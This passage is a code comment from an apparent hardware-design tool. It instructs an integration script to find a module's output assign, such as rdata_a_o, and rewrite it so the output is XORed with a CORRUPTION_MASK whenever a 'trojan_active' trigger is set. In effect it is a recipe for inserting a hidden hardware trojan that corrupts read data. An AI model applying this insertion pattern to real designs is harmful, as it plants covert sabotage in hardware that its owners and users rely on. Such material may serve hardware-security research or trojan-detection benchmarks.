...
//
// IMPORTANT: rdata_a_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If rdata_a_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for rdata_a_o (or first output assign):
//     assign rdata_a_o = <expr>;
//   Replace with:
//     assign rdata_a_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
